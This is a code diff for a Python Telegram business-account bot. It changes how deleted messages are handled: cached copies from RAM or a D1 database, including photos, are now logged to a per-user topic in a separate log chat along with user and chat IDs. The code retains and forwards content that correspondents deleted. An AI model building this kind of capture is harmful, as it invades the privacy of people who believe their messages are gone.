@@ -1364,7 +1364,6 @@ async def handle_edited_business_message(message):
         "topic_id": topic_id,
     }
 # ================== DELETED BUSINESS MESSAGES ==================
-
 @dp.deleted_business_messages()
 async def handle_deleted_business_messages(message):
     logger.info(
@@ -1373,26 +1372,59 @@ async def handle_deleted_business_messages(message):
         message.chat.id,
         message.message_ids,
     )
-
+    # ================== GET BUSINESS OWNER ==================
+    business_connection = await bot.get_business_connection(
+        business_connection_id=message.business_connection_id
+    )
+    user = business_connection.user
+    # ================== GET USER LOG TOPIC ==================
+    topic_id = business_topics.get(
+        message.business_connection_id
+    )
+    if topic_id is None and db_pool is not None:
+        async with db_pool.acquire() as conn:
+            row = await conn.fetchrow(
+                """
+                SELECT topic_id
+                FROM business_accounts
+                WHERE telegram_user_id = $1
+                """,
+                user.id,
+            )
+        if row:
+            topic_id = row["topic_id"]
+            business_topics[
+                message.business_connection_id
+            ] = topic_id
+            logger.info(
+                "DELETED MESSAGE TOPIC LOADED FROM DATABASE | "
+                "user=%s | topic_id=%s",
+                user.id,
+                topic_id,
+            )
+    if topic_id is None:
+        logger.error(
+            "DELETED MESSAGE TOPIC NOT FOUND | "
+            "connection=%s | user=%s",
+            message.business_connection_id,
+            user.id,
+        )
+        return
+    # ================== PROCESS DELETED MESSAGES ==================
     for deleted_message_id in message.message_ids:
-
         # ================== SEARCH IN RAM ==================
-
         ram_data = None
-
         batch_key = (
             message.business_connection_id,
             message.chat.id,
         )
-
         batch = d1_message_batches.get(batch_key)
-
         if batch:
             for item in batch["messages"]:
                 if item.get("message_id") == deleted_message_id:
                     ram_data = item
                     break
-
+        # ================== MESSAGE FOUND IN RAM ==================
         if ram_data:
             logger.info(
                 "DELETED MESSAGE FOUND IN RAM | "
@@ -1402,39 +1434,48 @@ async def handle_deleted_business_messages(message):
                 deleted_message_id,
                 ram_data,
             )
-
+            # ================== LOG DELETION ==================
+            await bot.send_message(
+                chat_id=int(LOG_CHAT_ID),
+                message_thread_id=topic_id,
+                text=(
+                    "🗑 СООБЩЕНИЕ УДАЛЕНО\n\n"
+                    f"👤 {user.first_name} {user.last_name or ''}\n"
+                    f"🆔 User ID: {user.id}\n"
+                    f"💬 Chat ID: {message.chat.id}\n"
+                    f"🆔 Message ID: {deleted_message_id}\n"
+                    f"📦 Тип: {ram_data.get('message_type')}"
+                ),
+            )
+            # ================== RESTORE PHOTO TO LOG ==================
             if ram_data.get("message_type") == "photo":
                 try:
                     await bot.send_photo(
-                        chat_id=message.chat.id,
+                        chat_id=int(LOG_CHAT_ID),
+                        message_thread_id=topic_id,
                         photo=ram_data["file_id"],
-                        business_connection_id=message.business_connection_id,
                         caption=(
-                            "♻️ УДАЛЁННОЕ ФОТО ВОССТАНОВЛЕНО\n"
+                            "♻️ УДАЛЁННОЕ ФОТО\n"
                             f"🆔 Message ID: {deleted_message_id}"
                         ),
                     )
-
                     logger.info(
-                        "DELETED PHOTO RESTORED FROM RAM | "
+                        "DELETED PHOTO RESTORED TO LOG FROM RAM | "
                         "connection=%s | chat=%s | message=%s",
                         message.business_connection_id,
                         message.chat.id,
                         deleted_message_id,
                     )
-
                 except Exception as e:
                     logger.exception(
-                        "DELETED PHOTO RESTORE ERROR FROM RAM | "
+                        "DELETED PHOTO RESTORE TO LOG ERROR FROM RAM | "
                         "connection=%s | chat=%s | message=%s | error=%s",
                         message.business_connection_id,
                         message.chat.id,
                         deleted_message_id,
                         e,
                     )
-
             continue
-
         # ================== SEARCH IN D1 ==================
         try:
             result = await d1_query(
@@ -1470,6 +1511,18 @@ async def handle_deleted_business_messages(message):
                     message.chat.id,
                     deleted_message_id,
                 )
+                await bot.send_message(
+                    chat_id=int(LOG_CHAT_ID),
+                    message_thread_id=topic_id,
+                    text=(
+                        "🗑 СООБЩЕНИЕ УДАЛЕНО\n\n"
+                        f"👤 {user.first_name} {user.last_name or ''}\n"
+                        f"🆔 User ID: {user.id}\n"
+                        f"💬 Chat ID: {message.chat.id}\n"
+                        f"🆔 Message ID: {deleted_message_id}\n\n"
+                        "⚠️ Данные сообщения не найдены."
+                    ),
+                )
                 continue
             row = results[0]
             messages = json.loads(
@@ -1497,20 +1550,33 @@ async def handle_deleted_business_messages(message):
                 deleted_message_id,
                 deleted_data,
             )
-            # ================== RESTORE PHOTO FROM D1 ==================
+            # ================== LOG DELETION ==================
+            await bot.send_message(
+                chat_id=int(LOG_CHAT_ID),
+                message_thread_id=topic_id,
+                text=(
+                    "🗑 СООБЩЕНИЕ УДАЛЕНО\n\n"
+                    f"👤 {user.first_name} {user.last_name or ''}\n"
+                    f"🆔 User ID: {user.id}\n"
+                    f"💬 Chat ID: {message.chat.id}\n"
+                    f"🆔 Message ID: {deleted_message_id}\n"
+                    f"📦 Тип: {deleted_data.get('message_type')}"
+                ),
+            )
+            # ================== RESTORE PHOTO TO LOG FROM D1 ==================
             if deleted_data.get("message_type") == "photo":
                 try:
                     await bot.send_photo(
-                        chat_id=message.chat.id,
+                        chat_id=int(LOG_CHAT_ID),
+                        message_thread_id=topic_id,
                         photo=deleted_data["file_id"],
-                        business_connection_id=message.business_connection_id,
                         caption=(
-                            "♻️ УДАЛЁННОЕ ФОТО ВОССТАНОВЛЕНО\n"
+                            "♻️ УДАЛЁННОЕ ФОТО\n"
                             f"🆔 Message ID: {deleted_message_id}"
                         ),
                     )
                     logger.info(
-                        "DELETED PHOTO RESTORED FROM D1 | "
+                        "DELETED PHOTO RESTORED TO LOG FROM D1 | "
                         "connection=%s | chat=%s | message=%s",
                         message.business_connection_id,
                         message.chat.id,
@@ -1518,7 +1584,7 @@ async def handle_deleted_business_messages(message):
                     )
                 except Exception as e:
                     logger.exception(
-                        "DELETED PHOTO RESTORE ERROR FROM D1 | "
+                        "DELETED PHOTO RESTORE TO LOG ERROR FROM D1 | "
                         "connection=%s | chat=%s | message=%s | error=%s",
                         message.business_connection_id,
                         message.chat.id,
